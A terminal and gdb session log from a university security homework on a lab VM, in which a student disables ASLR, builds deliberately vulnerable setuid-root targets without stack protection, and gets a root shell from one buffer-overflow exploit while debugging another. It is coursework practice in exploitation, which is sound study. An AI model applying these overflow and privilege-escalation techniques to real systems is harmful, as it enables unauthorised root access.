0xbfffffc4:	0x00000000	0x2c000000	0xa196d191	0xf9fe7047
0xbfffffd4:	0x4ff04143	0x69bd7d1a	0x00363836	0x6d742f00
0xbfffffe4:	0x61742f70	0x74656772	0x2f000031	0x2f706d74
0xbffffff4:	0x67726174	0x00317465	0x00000000	Cannot access memory at address 0xc0000000
(gdb) x/64 0xbfffff04-68
0xbffffec0:	0x00000000	0xb7ff0010	0xb7fea880	0xb7fff000
0xbffffed0:	0x00000002	0x080483a0	0x00000000	0x080483c1
0xbffffee0:	0x080484b5	0x00000002	0xbfffff04	0x08048500
0xbffffef0:	0x08048560	0xb7fea880	0xbffffefc	0xb7fff918
0xbfffff00:	0x00000002	0xbfffffe1	0xbfffffee	0x00000000
0xbfffff10:	0x00000000	0x00000020	0xb7fd9cec	0x00000021
0xbfffff20:	0xb7fd9000	0x00000010	0x178bfbff	0x00000006
0xbfffff30:	0x00001000	0x00000011	0x00000064	0x00000003
0xbfffff40:	0x08048034	0x00000004	0x00000020	0x00000005
0xbfffff50:	0x00000009	0x00000007	0xb7fdb000	0x00000008
0xbfffff60:	0x00000000	0x00000009	0x080483a0	0x0000000b
0xbfffff70:	0x000003e8	0x0000000c	0x000003e8	0x0000000d
0xbfffff80:	0x000003e8	0x0000000e	0x000003e8	0x00000017
0xbfffff90:	0x00000001	0x00000019	0xbfffffcb	0x0000001a
0xbfffffa0:	0x00000000	0x0000001f	0xbfffffef	0x0000000f
0xbfffffb0:	0xbfffffdb	0x00000000	0x00000000	0x00000000
(gdb) q
A debugging session is active.

	Inferior 1 [process 1997] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls
shellcode.h  sploit0  sploit0.c  sploit1  sploit1.c  sploit2.c  sploit3.c  sploit4.c  sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit1.c -o sploit1
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit1
Reading symbols from sploit1...done.
(gdb) break main
Breakpoint 1 at 0x804856c: file sploit1.c, line 22.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit1 

Breakpoint 1, main () at sploit1.c:22
22	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) continue
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) info frame
Stack level 0, frame at 0xbffff560:
 eip = 0xb7eb97e0 in execve (../sysdeps/unix/syscall-template.S:84); saved eip = 0x80485f2
 called by frame at 0xbffff5c0
 source language asm.
 Arglist at 0xbffff558, args: 
 Locals at 0xbffff558, Previous frame's sp is 0xbffff560
 Saved registers:
  eip at 0xbffff55c
(gdb) n
process 2043 is executing new program: /tmp/target1

Breakpoint 1, main (argc=2, argv=0xbffffee4) at target1.c:16
16	  if( argc != 2 )
(gdb) info frame
Stack level 0, frame at 0xbffffe50:
 eip = 0x80484b8 in main (target1.c:16); saved eip = 0xb7e21637
 source language c.
 Arglist at 0xbffffe48, args: argc=2, argv=0xbffffee4
 Locals at 0xbffffe48, Previous frame's sp is 0xbffffe50
 Saved registers:
  ebp at 0xbffffe48, eip at 0xbffffe4c
(gdb) x 0xbffffee4
0xbffffee4:	0xbfffffcd
(gdb) x/40 0xbffffee4
0xbffffee4:	0xbfffffcd	0xbfffffda	0x00000000	0x00000000
0xbffffef4:	0x00000020	0xb7fd9cec	0x00000021	0xb7fd9000
0xbfffff04:	0x00000010	0x178bfbff	0x00000006	0x00001000
0xbfffff14:	0x00000011	0x00000064	0x00000003	0x08048034
0xbfffff24:	0x00000004	0x00000020	0x00000005	0x00000009
0xbfffff34:	0x00000007	0xb7fdb000	0x00000008	0x00000000
0xbfffff44:	0x00000009	0x080483a0	0x0000000b	0x000003e8
0xbfffff54:	0x0000000c	0x000003e8	0x0000000d	0x000003e8
0xbfffff64:	0x0000000e	0x000003e8	0x00000017	0x00000001
0xbfffff74:	0x00000019	0xbfffffab	0x0000001a	0x00000000
(gdb) x/40 0xbffffee4-40
0xbffffebc:	0x080483c1	0x080484b5	0x00000002	0xbffffee4
0xbffffecc:	0x08048500	0x08048560	0xb7fea880	0xbffffedc
0xbffffedc:	0xb7fff918	0x00000002	0xbfffffcd	0xbfffffda
0xbffffeec:	0x00000000	0x00000000	0x00000020	0xb7fd9cec
0xbffffefc:	0x00000021	0xb7fd9000	0x00000010	0x178bfbff
0xbfffff0c:	0x00000006	0x00001000	0x00000011	0x00000064
0xbfffff1c:	0x00000003	0x08048034	0x00000004	0x00000020
0xbfffff2c:	0x00000005	0x00000009	0x00000007	0xb7fdb000
0xbfffff3c:	0x00000008	0x00000000	0x00000009	0x080483a0
0xbfffff4c:	0x0000000b	0x000003e8	0x0000000c	0x000003e8
(gdb) q
A debugging session is active.

	Inferior 1 [process 2043] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit1
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ Connection to localhost closed by remote host.
Connection to localhost closed.
adam@Adams-MacBook-Pro hw4 % ssh -p 2224 student@localhost
student@localhost's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-70-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

94 packages can be updated.
0 updates are security updates.

Last login: Thu Nov 28 13:16:10 2019 from 10.0.2.2
student@5435-hw4-vm:~$ sudo sysctl -w kernel.randomize_va_space=0
[sudo] password for student: 
kernel.randomize_va_space = 0
student@5435-hw4-vm:~$ ls
cs5435-fa19-hw4  Desktop    Downloads         Music     Public     Videos
demo             Documents  examples.desktop  Pictures  Templates
student@5435-hw4-vm:~$ cd cs5435-fa19-hw4/targets/
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ sudo make
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target0 target0.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target1 target1.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target2 target2.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target3 target3.c
gcc -ggdb -mpreferred-stack-boundary=2 -fno-stack-protector -o target4 target4.c
install -o root -t /tmp target0 target1 target2 target3 target4
chmod 4755 /tmp/target*
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ cd ../sploits/
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls
shellcode.h  sploit0  sploit0.c  sploit1  sploit1.c  sploit2.c  sploit3.c  sploit4.c  sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ 
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit1.c -o sploit1
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls -la
total 60
drwxr-xr-x 2 student student  4096 Nov 29 12:24 .
drwxr-xr-x 6 student student  4096 Nov 26 10:49 ..
-rwxr-xr-x 1 student student   475 Nov 26 10:49 shellcode.h
-rwxrwxr-x 1 student student 10316 Nov 27 20:22 sploit0
-rw-r--r-- 1 student student  1089 Nov 27 20:20 sploit0.c
-rwxrwxr-x 1 student student 10264 Nov 29 12:24 sploit1
-rw-r--r-- 1 student student   754 Nov 29 12:23 sploit1.c
-rw-r--r-- 1 student student   375 Nov 26 10:49 sploit2.c
-rw-r--r-- 1 student student   375 Nov 26 10:49 sploit3.c
-rw-r--r-- 1 student student   375 Nov 26 10:49 sploit4.c
-rw-r--r-- 1 student student   375 Nov 26 10:49 sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0
Hi ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
   ?
    ???V
        ̀1ۉ?@̀?????/bin/sh,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???
# q
/bin/sh: 1: q: not found
# exit
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit1
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls
shellcode.h  sploit0  sploit0.c  sploit1  sploit1.c  sploit2.c  sploit3.c  sploit4.c  sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ cd ..
student@5435-hw4-vm:~/cs5435-fa19-hw4$ cd targets/
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ls
Makefile  target0.c  target1.c  target2.c  target3.c  target4.c
target0   target1    target2    target3    target4
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ./target1
meet: argc != 2
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ./target1 "aa"
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ./target1 "aaaaaaaa"
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ./target1 "aaaaaaaaaaaa"
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ./target1 "aaaaaaaaaaaaaaaa"
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ./target1 "aaaaaaaaaaaaaaaa" "r"
meet: argc != 2
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ cd ../sploits/
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls
shellcode.h  sploit0  sploit0.c  sploit1  sploit1.c  sploit2.c  sploit3.c  sploit4.c  sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit1.c -o sploit1
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls
shellcode.h  sploit0  sploit0.c  sploit1  sploit1.c  sploit2.c  sploit3.c  sploit4.c  sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit1
Reading symbols from sploit1...done.
(gdb) break main
Breakpoint 1 at 0x804856c: file sploit1.c, line 22.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit1 

Breakpoint 1, main () at sploit1.c:22
22	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) continue
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) info frame
Stack level 0, frame at 0xbffff560:
 eip = 0xb7eb97e0 in execve (../sysdeps/unix/syscall-template.S:84); saved eip = 0x80485f2
 called by frame at 0xbffff5c0
 source language asm.
 Arglist at 0xbffff558, args: 
 Locals at 0xbffff558, Previous frame's sp is 0xbffff560
 Saved registers:
  eip at 0xbffff55c
(gdb) n
process 1602 is executing new program: /tmp/target1

Breakpoint 1, main (argc=2, argv=0xbffffef4) at target1.c:16
16	  if( argc != 2 )
(gdb) break 10
Breakpoint 3 at 0x80484a1: file target1.c, line 10.
(gdb) continue
Continuing.

Breakpoint 3, foo (temp=0xbfffffe2 '\220' <repeats 12 times>) at target1.c:10
10	  strncpy(name, temp, 12);
(gdb) info frame
Stack level 0, frame at 0xbffffe54:
 eip = 0x80484a1 in foo (target1.c:10); saved eip = 0x80484ea
 called by frame at 0xbffffe60
 source language c.
 Arglist at 0xbffffe4c, args: temp=0xbfffffe2 '\220' <repeats 12 times>
 Locals at 0xbffffe4c, Previous frame's sp is 0xbffffe54
 Saved registers:
  ebp at 0xbffffe4c, eip at 0xbffffe50
(gdb) x/64x 0xbffffe50-32
0xbffffe30:	0x00000002	0xbffffef4	0xbfffff00	0x08048521
0xbffffe40:	0xb7fbb3dc	0x08048210	0x08048509	0xbffffe58
0xbffffe50:	0x080484ea	0xbfffffe2	0x00000000	0xb7e21637
0xbffffe60:	0x00000002	0xbffffef4	0xbfffff00	0x00000000
0xbffffe70:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe80:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe90:	0x00000000	0xfa20133f	0xc1f73d2f	0x00000000
0xbffffea0:	0x00000000	0x00000000	0x00000002	0x080483a0
0xbffffeb0:	0x00000000	0xb7ff0010	0xb7fea880	0xb7fff000
0xbffffec0:	0x00000002	0x080483a0	0x00000000	0x080483c1
0xbffffed0:	0x080484b5	0x00000002	0xbffffef4	0x08048500
0xbffffee0:	0x08048560	0xb7fea880	0xbffffeec	0xb7fff918
0xbffffef0:	0x00000002	0xbfffffd5	0xbfffffe2	0x00000000
0xbfffff00:	0x00000000	0x00000020	0xb7fd9cec	0x00000021
0xbfffff10:	0xb7fd9000	0x00000010	0x178bfbff	0x00000006
0xbfffff20:	0x00001000	0x00000011	0x00000064	0x00000003
(gdb) x/x $eip
0x80484a1 <foo+6>:	0x75ff0c6a
(gdb) x/64x 0x80484a1-32
0x8048481 <frame_dummy+17>:	0x00000000	0xf274d285	0x83e58955	0xff5014ec
0x8048491 <frame_dummy+33>:	0x10c483d2	0xff75e9c9	0x8955ffff	0x04ec83e5
0x80484a1 <foo+6>:	0x75ff0c6a	0xfc458d08	0xfed1e850	0xc483ffff
0x80484b1 <foo+22>:	0xc3c9900c	0x83e58955	0x7402087d	0xa028a11e
0x80484c1 <main+12>:	0x6a500804	0x68016a10	0x08048580	0xfffe7ee8
0x80484d1 <main+28>:	0x10c483ff	0x84e8016a	0x8bfffffe	0xc0830c45
0x80484e1 <main+44>:	0x50008b04	0xffffb1e8	0x04c483ff	0x000000b8
0x80484f1 <main+60>:	0x66c3c900	0x66906690	0x66906690	0x55906690
0x8048501 <__libc_csu_init+1>:	0xe8535657	0xfffffec7	0x1af7c381	0xec830000
0x8048511 <__libc_csu_init+17>:	0x246c8b0c	0x0cb38d20	0xe8ffffff	0xfffffdef
0x8048521 <__libc_csu_init+33>:	0xff08838d	0xc629ffff	0x8502fec1	0x312574f6
0x8048531 <__libc_csu_init+49>:	0x00b68dff	0x83000000	0x74ff04ec	0x74ff2c24
0x8048541 <__libc_csu_init+65>:	0xff552c24	0xff08bb94	0xc783ffff	0x10c48301
0x8048551 <__libc_csu_init+81>:	0xe375f739	0x5b0cc483	0xc35d5f5e	0xf300768d
0x8048561 <__libc_csu_fini+1>:	0x530000c3	0xe808ec83	0xfffffe63	0x1a93c381
0x8048571 <_fini+13>:	0xc4830000	0x03c35b08	0x01000000	0x6d000200
(gdb) x/x $esp
0xbffffe48:	0x08048509
(gdb) x/64x 0xbffffe48-32
0xbffffe28:	0xb7e37a50	0x0804854b	0x00000002	0xbffffef4
0xbffffe38:	0xbfffff00	0x08048521	0xb7fbb3dc	0x08048210
0xbffffe48:	0x08048509	0xbffffe58	0x080484ea	0xbfffffe2
0xbffffe58:	0x00000000	0xb7e21637	0x00000002	0xbffffef4
0xbffffe68:	0xbfffff00	0x00000000	0x00000000	0x00000000
0xbffffe78:	0xb7fbb000	0xb7fffc04	0xb7fff000	0x00000000
0xbffffe88:	0xb7fbb000	0xb7fbb000	0x00000000	0xfa20133f
0xbffffe98:	0xc1f73d2f	0x00000000	0x00000000	0x00000000
0xbffffea8:	0x00000002	0x080483a0	0x00000000	0xb7ff0010
0xbffffeb8:	0xb7fea880	0xb7fff000	0x00000002	0x080483a0
0xbffffec8:	0x00000000	0x080483c1	0x080484b5	0x00000002
0xbffffed8:	0xbffffef4	0x08048500	0x08048560	0xb7fea880
0xbffffee8:	0xbffffeec	0xb7fff918	0x00000002	0xbfffffd5
0xbffffef8:	0xbfffffe2	0x00000000	0x00000000	0x00000020
0xbfffff08:	0xb7fd9cec	0x00000021	0xb7fd9000	0x00000010
0xbfffff18:	0x178bfbff	0x00000006	0x00001000	0x00000011
(gdb) n
11	}
(gdb) x/x $esp
0xbffffe48:	0x90909090
(gdb) x/64x 0xbffffe48-32
0xbffffe28:	0xb7e90820	0xb7fbb000	0xb7fbb000	0x00000000
0xbffffe38:	0x080484af	0xbffffe48	0xbfffffe2	0x0000000c
0xbffffe48:	0x90909090	0x90909090	0x90909090	0xbfffffe2
0xbffffe58:	0x00000000	0xb7e21637	0x00000002	0xbffffef4
0xbffffe68:	0xbfffff00	0x00000000	0x00000000	0x00000000
0xbffffe78:	0xb7fbb000	0xb7fffc04	0xb7fff000	0x00000000
0xbffffe88:	0xb7fbb000	0xb7fbb000	0x00000000	0xfa20133f
0xbffffe98:	0xc1f73d2f	0x00000000	0x00000000	0x00000000
0xbffffea8:	0x00000002	0x080483a0	0x00000000	0xb7ff0010
0xbffffeb8:	0xb7fea880	0xb7fff000	0x00000002	0x080483a0
0xbffffec8:	0x00000000	0x080483c1	0x080484b5	0x00000002
0xbffffed8:	0xbffffef4	0x08048500	0x08048560	0xb7fea880
0xbffffee8:	0xbffffeec	0xb7fff918	0x00000002	0xbfffffd5
0xbffffef8:	0xbfffffe2	0x00000000	0x00000000	0x00000020
0xbfffff08:	0xb7fd9cec	0x00000021	0xb7fd9000	0x00000010
0xbfffff18:	0x178bfbff	0x00000006	0x00001000	0x00000011
(gdb) x/x $eip
0x80484b2 <foo+23>:	0x55c3c990
(gdb) info frame
Stack level 0, frame at 0xbffffe54:
 eip = 0x80484b2 in foo (target1.c:11); saved eip = 0x90909090
 called by frame at 0xbffffe58
 source language c.
 Arglist at 0xbffffe4c, args: temp=0xbfffffe2 '\220' <repeats 12 times>
 Locals at 0xbffffe4c, Previous frame's sp is 0xbffffe54
 Saved registers:
  ebp at 0xbffffe4c, eip at 0xbffffe50
(gdb) break 23
Breakpoint 4 at 0x80484ed: file target1.c, line 23.
(gdb) n
0x90909090 in ?? ()
(gdb) n
Cannot find bounds of current function
(gdb) q
A debugging session is active.

	Inferior 1 [process 1602] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit1
Reading symbols from sploit1...done.
(gdb) break main
Breakpoint 1 at 0x804856c: file sploit1.c, line 22.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit1 

Breakpoint 1, main () at sploit1.c:22
22	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) continue
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 1610 is executing new program: /tmp/target1

Breakpoint 1, main (argc=2, argv=0xbffffef4) at target1.c:16
16	  if( argc != 2 )
(gdb) info frame
Stack level 0, frame at 0xbffffe60:
 eip = 0x80484b8 in main (target1.c:16); saved eip = 0xb7e21637
 source language c.
 Arglist at 0xbffffe58, args: argc=2, argv=0xbffffef4
 Locals at 0xbffffe58, Previous frame's sp is 0xbffffe60
 Saved registers:
  ebp at 0xbffffe58, eip at 0xbffffe5c
(gdb) x/64x 0xbffffef4-32
0xbffffed4:	0x00000002	0xbffffef4	0x08048500	0x08048560
0xbffffee4:	0xb7fea880	0xbffffeec	0xb7fff918	0x00000002
0xbffffef4:	0xbfffffd5	0xbfffffe2	0x00000000	0x00000000
0xbfffff04:	0x00000020	0xb7fd9cec	0x00000021	0xb7fd9000
0xbfffff14:	0x00000010	0x178bfbff	0x00000006	0x00001000
0xbfffff24:	0x00000011	0x00000064	0x00000003	0x08048034
0xbfffff34:	0x00000004	0x00000020	0x00000005	0x00000009
0xbfffff44:	0x00000007	0xb7fdb000	0x00000008	0x00000000
0xbfffff54:	0x00000009	0x080483a0	0x0000000b	0x000003e8
0xbfffff64:	0x0000000c	0x000003e8	0x0000000d	0x000003e8
0xbfffff74:	0x0000000e	0x000003e8	0x00000017	0x00000001
0xbfffff84:	0x00000019	0xbfffffbb	0x0000001a	0x00000000
0xbfffff94:	0x0000001f	0xbfffffef	0x0000000f	0xbfffffcb
0xbfffffa4:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffffb4:	0x00000000	0xca000000	0x91b18d34	0x045fbe98
0xbfffffc4:	0x6bfed0a8	0x6972ec96	0x00363836	0x00000000
(gdb) x\x $esp
Invalid character '\' in expression.
(gdb) x/x $esp
0xbffffe58:	0x00000000
(gdb) x/64x 0xbffffe58-32
0xbffffe38:	0xbfffff00	0x08048521	0xb7fbb3dc	0x08048210
0xbffffe48:	0x08048509	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe58:	0x00000000	0xb7e21637	0x00000002	0xbffffef4
0xbffffe68:	0xbfffff00	0x00000000	0x00000000	0x00000000
0xbffffe78:	0xb7fbb000	0xb7fffc04	0xb7fff000	0x00000000
0xbffffe88:	0xb7fbb000	0xb7fbb000	0x00000000	0x82cde3c0
0xbffffe98:	0xb91acdd0	0x00000000	0x00000000	0x00000000
0xbffffea8:	0x00000002	0x080483a0	0x00000000	0xb7ff0010
0xbffffeb8:	0xb7fea880	0xb7fff000	0x00000002	0x080483a0
0xbffffec8:	0x00000000	0x080483c1	0x080484b5	0x00000002
0xbffffed8:	0xbffffef4	0x08048500	0x08048560	0xb7fea880
0xbffffee8:	0xbffffeec	0xb7fff918	0x00000002	0xbfffffd5
0xbffffef8:	0xbfffffe2	0x00000000	0x00000000	0x00000020
0xbfffff08:	0xb7fd9cec	0x00000021	0xb7fd9000	0x00000010
0xbfffff18:	0x178bfbff	0x00000006	0x00001000	0x00000011
0xbfffff28:	0x00000064	0x00000003	0x08048034	0x00000004
(gdb) x/64x 0xbffffe58+32
0xbffffe78:	0xb7fbb000	0xb7fffc04	0xb7fff000	0x00000000
0xbffffe88:	0xb7fbb000	0xb7fbb000	0x00000000	0x82cde3c0
0xbffffe98:	0xb91acdd0	0x00000000	0x00000000	0x00000000
0xbffffea8:	0x00000002	0x080483a0	0x00000000	0xb7ff0010
0xbffffeb8:	0xb7fea880	0xb7fff000	0x00000002	0x080483a0
0xbffffec8:	0x00000000	0x080483c1	0x080484b5	0x00000002
0xbffffed8:	0xbffffef4	0x08048500	0x08048560	0xb7fea880
0xbffffee8:	0xbffffeec	0xb7fff918	0x00000002	0xbfffffd5
0xbffffef8:	0xbfffffe2	0x00000000	0x00000000	0x00000020
0xbfffff08:	0xb7fd9cec	0x00000021	0xb7fd9000	0x00000010
0xbfffff18:	0x178bfbff	0x00000006	0x00001000	0x00000011
0xbfffff28:	0x00000064	0x00000003	0x08048034	0x00000004
0xbfffff38:	0x00000020	0x00000005	0x00000009	0x00000007
0xbfffff48:	0xb7fdb000	0x00000008	0x00000000	0x00000009
0xbfffff58:	0x080483a0	0x0000000b	0x000003e8	0x0000000c
0xbfffff68:	0x000003e8	0x0000000d	0x000003e8	0x0000000e
(gdb) info frame
Stack level 0, frame at 0xbffffe60:
 eip = 0x80484b8 in main (target1.c:16); saved eip = 0xb7e21637
 source language c.
 Arglist at 0xbffffe58, args: argc=2, argv=0xbffffef4
 Locals at 0xbffffe58, Previous frame's sp is 0xbffffe60
 Saved registers:
  ebp at 0xbffffe58, eip at 0xbffffe5c
(gdb) x/64x 0xbffffe58-32
0xbffffe38:	0xbfffff00	0x08048521	0xb7fbb3dc	0x08048210
0xbffffe48:	0x08048509	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe58:	0x00000000	0xb7e21637	0x00000002	0xbffffef4
0xbffffe68:	0xbfffff00	0x00000000	0x00000000	0x00000000
0xbffffe78:	0xb7fbb000	0xb7fffc04	0xb7fff000	0x00000000
0xbffffe88:	0xb7fbb000	0xb7fbb000	0x00000000	0x82cde3c0
0xbffffe98:	0xb91acdd0	0x00000000	0x00000000	0x00000000
0xbffffea8:	0x00000002	0x080483a0	0x00000000	0xb7ff0010
0xbffffeb8:	0xb7fea880	0xb7fff000	0x00000002	0x080483a0
0xbffffec8:	0x00000000	0x080483c1	0x080484b5	0x00000002
0xbffffed8:	0xbffffef4	0x08048500	0x08048560	0xb7fea880
0xbffffee8:	0xbffffeec	0xb7fff918	0x00000002	0xbfffffd5
0xbffffef8:	0xbfffffe2	0x00000000	0x00000000	0x00000020
0xbfffff08:	0xb7fd9cec	0x00000021	0xb7fd9000	0x00000010
0xbfffff18:	0x178bfbff	0x00000006	0x00001000	0x00000011
0xbfffff28:	0x00000064	0x00000003	0x08048034	0x00000004
(gdb) x/64x 0xbffffe58+32
0xbffffe78:	0xb7fbb000	0xb7fffc04	0xb7fff000	0x00000000
0xbffffe88:	0xb7fbb000	0xb7fbb000	0x00000000	0x82cde3c0
0xbffffe98:	0xb91acdd0	0x00000000	0x00000000	0x00000000
0xbffffea8:	0x00000002	0x080483a0	0x00000000	0xb7ff0010
0xbffffeb8:	0xb7fea880	0xb7fff000	0x00000002	0x080483a0
0xbffffec8:	0x00000000	0x080483c1	0x080484b5	0x00000002
0xbffffed8:	0xbffffef4	0x08048500	0x08048560	0xb7fea880
0xbffffee8:	0xbffffeec	0xb7fff918	0x00000002	0xbfffffd5
0xbffffef8:	0xbfffffe2	0x00000000	0x00000000	0x00000020
0xbfffff08:	0xb7fd9cec	0x00000021	0xb7fd9000	0x00000010
0xbfffff18:	0x178bfbff	0x00000006	0x00001000	0x00000011
0xbfffff28:	0x00000064	0x00000003	0x08048034	0x00000004
0xbfffff38:	0x00000020	0x00000005	0x00000009	0x00000007
0xbfffff48:	0xb7fdb000	0x00000008	0x00000000	0x00000009
0xbfffff58:	0x080483a0	0x0000000b	0x000003e8	0x0000000c
0xbfffff68:	0x000003e8	0x0000000d	0x000003e8	0x0000000e
(gdb) x/x $ebp
0xbffffe58:	0x00000000
(gdb) x/64x 0xbffffe58-32
0xbffffe38:	0xbfffff00	0x08048521	0xb7fbb3dc	0x08048210
0xbffffe48:	0x08048509	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe58:	0x00000000	0xb7e21637	0x00000002	0xbffffef4
0xbffffe68:	0xbfffff00	0x00000000	0x00000000	0x00000000
0xbffffe78:	0xb7fbb000	0xb7fffc04	0xb7fff000	0x00000000
0xbffffe88:	0xb7fbb000	0xb7fbb000	0x00000000	0x82cde3c0
0xbffffe98:	0xb91acdd0	0x00000000	0x00000000	0x00000000
0xbffffea8:	0x00000002	0x080483a0	0x00000000	0xb7ff0010
0xbffffeb8:	0xb7fea880	0xb7fff000	0x00000002	0x080483a0
0xbffffec8:	0x00000000	0x080483c1	0x080484b5	0x00000002
0xbffffed8:	0xbffffef4	0x08048500	0x08048560	0xb7fea880
0xbffffee8:	0xbffffeec	0xb7fff918	0x00000002	0xbfffffd5
0xbffffef8:	0xbfffffe2	0x00000000	0x00000000	0x00000020
0xbfffff08:	0xb7fd9cec	0x00000021	0xb7fd9000	0x00000010
0xbfffff18:	0x178bfbff	0x00000006	0x00001000	0x00000011
0xbfffff28:	0x00000064	0x00000003	0x08048034	0x00000004
(gdb) x/64x 0xbffffe58-64
0xbffffe18:	0xb7fb9244	0xb7e210ec	0x00000002	0x00000000
0xbffffe28:	0xb7e37a50	0x0804854b	0x00000002	0xbffffef4
0xbffffe38:	0xbfffff00	0x08048521	0xb7fbb3dc	0x08048210
0xbffffe48:	0x08048509	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe58:	0x00000000	0xb7e21637	0x00000002	0xbffffef4
0xbffffe68:	0xbfffff00	0x00000000	0x00000000	0x00000000
0xbffffe78:	0xb7fbb000	0xb7fffc04	0xb7fff000	0x00000000
0xbffffe88:	0xb7fbb000	0xb7fbb000	0x00000000	0x82cde3c0
0xbffffe98:	0xb91acdd0	0x00000000	0x00000000	0x00000000
0xbffffea8:	0x00000002	0x080483a0	0x00000000	0xb7ff0010
0xbffffeb8:	0xb7fea880	0xb7fff000	0x00000002	0x080483a0
0xbffffec8:	0x00000000	0x080483c1	0x080484b5	0x00000002
0xbffffed8:	0xbffffef4	0x08048500	0x08048560	0xb7fea880
0xbffffee8:	0xbffffeec	0xb7fff918	0x00000002	0xbfffffd5
0xbffffef8:	0xbfffffe2	0x00000000	0x00000000	0x00000020
0xbfffff08:	0xb7fd9cec	0x00000021	0xb7fd9000	0x00000010
(gdb) x/128x 0xbffffe58-64
0xbffffe18:	0xb7fb9244	0xb7e210ec	0x00000002	0x00000000
0xbffffe28:	0xb7e37a50	0x0804854b	0x00000002	0xbffffef4
0xbffffe38:	0xbfffff00	0x08048521	0xb7fbb3dc	0x08048210
0xbffffe48:	0x08048509	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe58:	0x00000000	0xb7e21637	0x00000002	0xbffffef4
0xbffffe68:	0xbfffff00	0x00000000	0x00000000	0x00000000
0xbffffe78:	0xb7fbb000	0xb7fffc04	0xb7fff000	0x00000000
0xbffffe88:	0xb7fbb000	0xb7fbb000	0x00000000	0x82cde3c0
0xbffffe98:	0xb91acdd0	0x00000000	0x00000000	0x00000000
0xbffffea8:	0x00000002	0x080483a0	0x00000000	0xb7ff0010
0xbffffeb8:	0xb7fea880	0xb7fff000	0x00000002	0x080483a0
0xbffffec8:	0x00000000	0x080483c1	0x080484b5	0x00000002
0xbffffed8:	0xbffffef4	0x08048500	0x08048560	0xb7fea880
0xbffffee8:	0xbffffeec	0xb7fff918	0x00000002	0xbfffffd5
0xbffffef8:	0xbfffffe2	0x00000000	0x00000000	0x00000020
0xbfffff08:	0xb7fd9cec	0x00000021	0xb7fd9000	0x00000010
0xbfffff18:	0x178bfbff	0x00000006	0x00001000	0x00000011
0xbfffff28:	0x00000064	0x00000003	0x08048034	0x00000004
